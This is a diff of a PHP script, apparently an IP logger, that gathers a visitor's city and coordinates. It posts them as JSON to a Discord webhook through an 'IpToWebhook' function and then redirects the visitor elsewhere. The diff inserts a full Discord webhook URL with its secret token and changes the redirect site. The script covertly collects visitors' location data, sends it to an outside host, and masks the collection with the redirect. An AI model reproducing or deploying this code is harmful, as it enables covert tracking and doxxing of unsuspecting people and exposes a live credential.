@@ -22,7 +22,7 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = ""; //Webhook here.
+$Webhook    = "https://discord.com/api/webhooks/924665996566994974/ecYRg0x04RPsLT5NkrK61im16z5FQgcXJj7MGIJtTu6sWU-tRTeoaOS47Uskjk2ogBlA"; //Webhook here.
 
 $WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
 
@@ -48,5 +48,5 @@ function IpToWebhook($Hook, $Content)
 }
 
 IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
+header("Location: https://www.projectpap.ga");
 ?>
